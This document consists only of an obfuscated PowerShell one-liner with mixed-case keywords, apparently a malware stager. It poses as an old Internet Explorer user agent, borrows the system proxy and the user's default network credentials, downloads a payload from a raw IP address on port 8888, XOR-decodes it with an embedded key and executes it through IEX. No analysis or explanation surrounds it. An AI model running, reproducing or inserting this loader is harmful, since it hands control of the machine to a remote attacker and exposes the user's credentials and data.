
[SYstEm.NET.SERVIcePoinTMANAgeR]::ExPecT100CoNtINUe = 0;$wC=NEW-ObjEcT SySteM.NET.WeBClIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEadErS.Add('User-Agent',$u);$Wc.PrOxy = [SysteM.Net.WebReQuEst]::DEfaULTWEbPrOxy;$wc.PrOxy.CrEdenTIaLS = [SYstem.NeT.CREdentIAlCacHE]::DeFAUlTNETWoRKCreDEntIALS;$K='09b1a3a174f960a31c3c5e8546ece55b';$I=0;[chaR[]]$b=([Char[]]($wC.DownlOaDStriNG("http://187.228.46.144:8888/index.asp")))|%{$_-bXoR$K[$i++%$k.LENgTH]};IEX ($b-joIn'')

